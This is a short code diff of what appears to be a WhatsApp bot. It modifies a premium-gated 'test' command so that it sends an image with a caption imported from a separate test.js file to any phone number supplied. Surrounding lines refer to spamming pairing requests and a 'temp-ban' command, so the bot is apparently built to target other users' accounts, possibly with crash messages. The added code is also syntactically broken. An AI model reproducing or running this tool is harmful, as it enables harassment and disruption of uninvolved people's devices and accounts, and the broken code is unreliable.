@@ -162,6 +162,10 @@ const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, che
 const orgkaya = JSON.parse(fs.readFileSync('./database/premium.json'))
 const zetsQuoted = fs.readFileSync(`./media/spider.jpg`)
 const testi  = fs.readFileSync(`./test.txt`)
+const {
+			make
+		} = require("./test.js")
+		const {
 //=================================================//
 //Group
 const groupMetadata = m.isGroup ? await sam.groupMetadata(m.chat).catch(e => {}) : ''
@@ -1170,10 +1174,10 @@ await spamPairingRequest(sanitizedPhoneNumber, attempts);*/
 break;
 case 'test': {
 if (!isPremium) return reply('You are not premium ')
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
+if (!args[0]) return reply(`use ${prefix+command} number ${prefix+command} 2547214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-sam.sendMessage(bnnd, { caption: testi }, { quoted:m })
-reply(`Sukses Target Telah Di Kirim ${command}`)
+sam.sendMessage(bnnd, { image: spider,  caption: ${make} }, { quoted:m })
+reply(`Succes sent using ${command}`)
 }
 break
 case 'temp-ban': {
